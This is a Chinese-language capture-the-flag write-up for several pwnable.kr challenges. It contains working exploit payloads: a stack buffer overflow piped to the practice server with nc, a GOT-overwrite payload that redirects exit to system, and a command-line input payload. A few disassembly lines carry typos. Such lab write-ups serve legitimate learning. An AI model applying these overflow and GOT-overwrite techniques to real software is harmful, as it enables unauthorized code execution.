#bof
```
import struct
padding = 'A'*52 #这里不是算的
key_addr = struct.pack("I", 0xcafebabe)
print padding + key_addr
```
重点是确定填充的字节，由func中
0x56555649 <+29>:   lea    eax,[ebp-0x2c]
2C 是 44 填充44个A 再加上addr正好覆盖ebp这个地址，而
0x56555654 <+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe
所以只有再加8就正好覆盖了比较的地址，即key的位置。
知道这个之后就可以利用python加管道进行pwn
(python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000

#flag
IDA打开之后就看到upx的字符，猜测是upx壳，linux下看了一下，apt安装下upx然后就可以解壳了

#passcode
这题完全不知道怎么做，然后看国外大牛的wp。理解了半天，没懂。
然后自己gdb调试，，忽然想起来，在调用welcome之后和调用login之后，
esp的地址一样，这样因为函数开始的时候都有mov    ebp,esp。
所以ebp(ebp在整个函数初始化指针之后是不会再改变的)就是可以认为是一样的，然后welcome调用结束后的数据并没有清楚，而是留在栈上，栈调用welcome结束后仅仅是把指针调整了，并没有清除数据，所以这里就是可以利用的地方。
然后这个还有个条件，就是scanf("%d", passcode1);IDA逆向出来是__isoc99_scanf("%d");这样程序就会直接读取对应栈上的值
0x70-0x10 = 0x60 = 96。只要有96个就能覆盖passcode1的值
```
welcome:
0x0804862f <+38>:   lea    edx,[ebp-0x70]
0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
0x08048636 <+45>:    mov    DWORD PTR [esp],eax
0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
login:
0x0804857c <+24>:   mov    edx,DWORD PTR [ebp-0x10]
```
之后就是直接的plt利用了，不过这个也是理解了不少时间，实际上就是call exit的时候，实际上是先执行jmp _exit (_exit就是实际上exit的地址，而采用全局偏移表的方式存储，只要把这个地方改掉就行了。)
```
0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
0x080485de <+122>:   call   0x848450 <puts@plt>
0x080485e3 <+127>:   mov    DW0ORD PTR [esp],0x80487af
0x080485ea <+134>:   call   0x8048460 <system@plt>
```
system("")对应的地址：0x080485d7 = 134514135
0x080485e3
偏移表中exit对应的地址804a018
于是就可以'A'*96 + '\x18\xa0\x04\x08' + '134514135\n'

#random
开始看的rand没有思路，然而，，，如此简单。
rand需要先srand初始化化下时间种子，否则rand的返回值一直固定。然后利用异或的性质，ok

#input
```
./input `python -c "print 'A '*47 + '\x00' + '\x20\x0a\x0d'"`
```